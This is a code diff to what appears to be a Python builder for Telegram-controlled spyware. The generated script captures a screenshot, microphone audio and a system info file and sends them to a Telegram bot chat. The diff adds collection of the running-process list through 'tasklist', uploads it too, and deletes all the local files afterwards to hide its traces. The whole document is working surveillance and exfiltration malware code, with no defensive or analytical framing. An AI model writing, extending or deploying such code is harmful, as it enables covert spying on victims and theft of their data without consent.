@@ -22,7 +22,9 @@ import telebot
 import pyaudio
 import wave
 from PIL import Image
+from subprocess import Popen, PIPE
 bot = telebot.TeleBot("''' + API.get() + '''")
+process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
 chunk = 1024
 formats = pyaudio.paInt16
 channels = 2
@@ -102,14 +104,18 @@ def start_message(message):
     upaudio = open("''' + direct.get() + '''\sound.wav", "rb")
     upfile = open("''' + direct.get() + '''\info.txt", "rb")
     uphoto = open("''' + direct.get() + '''\screenshot.jpg", "rb")
+    upprocess = open("''' + direct.get() + '''\process.txt", "rb")
     bot.send_photo(message.chat.id, uphoto, text)
     bot.send_document(message.chat.id, upfile)
+    bot.send_document(message.chat.id, upprocess)
     bot.send_voice(message.chat.id, upaudio)
     upfile.close()
+    upprocess.close()
     uphoto.close()
     upaudio.close()
 
     os.remove("info.txt")
+    os.remove("process.txt")
     os.remove("screenshot.jpg")
     os.remove("sound.wav")
 
